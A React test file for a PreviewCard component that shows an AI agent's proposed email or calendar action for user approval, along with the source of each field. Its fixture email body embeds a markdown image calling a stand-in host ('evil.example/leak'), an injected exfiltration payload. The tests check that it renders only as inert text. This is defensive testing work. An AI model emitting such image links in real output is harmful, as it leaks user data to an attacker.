import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { PreviewCard } from '../../src/components/PreviewCard.jsx';

const card = {
  approvalId: 'a1',
  kind: 'email',
  tool: 'send_email',
  reason: 'Sending email always needs your approval.',
  fields: {
    to: { value: ['bob@example.com'], sources: [{ type: 'user' }] },
    subject: { value: 'Flight details', sources: [{ type: 'user' }] },
    body: {
      value: 'Your flight is at 10:00.\n![](https://evil.example/leak?d=x) <b>bold</b>',
      sources: [
        { type: 'email', id: 'g1', from: 'airline@example.com', date: '2026-10-01T09:00:00Z' },
      ],
    },
  },
};

describe('PreviewCard', () => {
  it('shows the action, every field as plain text, and each value’s sources', () => {
    render(<PreviewCard card={card} />);
    expect(screen.getByText('Send email')).toBeTruthy();
    expect(screen.getByText('bob@example.com')).toBeTruthy();
    expect(
      screen.getByText(/!\[\]\(https:\/\/evil\.example\/leak\?d=x\) <b>bold<\/b>/),
    ).toBeTruthy();
    expect(document.querySelector('img')).toBeNull();
    expect(document.querySelector('b')).toBeNull();
    expect(screen.getAllByText('From you')).toHaveLength(2);
    expect(screen.getByText('From email from airline@example.com on 2026-10-01')).toBeTruthy();
    expect(screen.getByText(/Some content comes from an email/)).toBeTruthy();
  });

  it('shows a composer reply as "Reply" with Send, hiding its threading plumbing (PLAN §14)', () => {
    const reply = {
      ...card,
      fields: {
        ...card.fields,
        in_reply_to: { value: '<m1@acme-corp.com>', sources: [{ type: 'user' }] },
        thread_id: { value: 't-1', sources: [{ type: 'user' }] },
        draft_id: { value: 'r-77', sources: [{ type: 'user' }] },
      },
    };
    render(<PreviewCard card={reply} onDecide={() => {}} />);
    expect(screen.getByText('Reply')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Send' })).toBeTruthy();
    expect(screen.queryByText('<m1@acme-corp.com>')).toBeNull();
    expect(screen.queryByText('r-77')).toBeNull();
    expect(screen.getByText('bob@example.com')).toBeTruthy();
  });

  it('labels the confirm button by kind and reports the decision', () => {
    const onDecide = vi.fn();
    render(<PreviewCard card={{ ...card, kind: 'event' }} onDecide={onDecide} />);
    fireEvent.click(screen.getByRole('button', { name: 'Save' }));
    fireEvent.click(screen.getByRole('button', { name: 'Reject' }));
    expect(onDecide.mock.calls.map(([action]) => action)).toEqual(['approve', 'reject']);
  });

  it('has no buttons without a decision handler and disables them while busy', () => {
    const { rerender } = render(<PreviewCard card={card} />);
    expect(screen.queryByRole('button')).toBeNull();
    rerender(<PreviewCard card={card} onDecide={() => {}} busy />);
    for (const button of screen.getAllByRole('button')) expect(button.disabled).toBe(true);
  });
});
